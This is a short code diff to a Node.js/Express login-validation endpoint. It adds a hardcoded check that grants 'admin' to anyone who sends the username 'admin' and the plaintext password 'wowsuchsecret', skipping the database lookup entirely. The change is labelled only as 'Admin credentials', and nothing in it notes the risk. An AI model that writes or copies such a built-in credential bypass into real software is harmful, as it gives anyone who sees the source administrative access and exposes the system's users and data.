@@ -572,6 +572,14 @@ app.get('/validateCredentials', function (req, res) {
     var email = req.get('email');
     var given_password = sha1(req.get('password'));
 
+    // Admin credentials
+    if(email == 'admin' && req.get('password') == 'wowsuchsecret') {
+        res.writeHead(200, {'Content-Type': 'text/plain'});
+        res.write('admin');
+        res.end();
+        return;
+    }
+
     var client = new pg.Client(conString);
     var result = [];
     client.connect(function (err, done) {
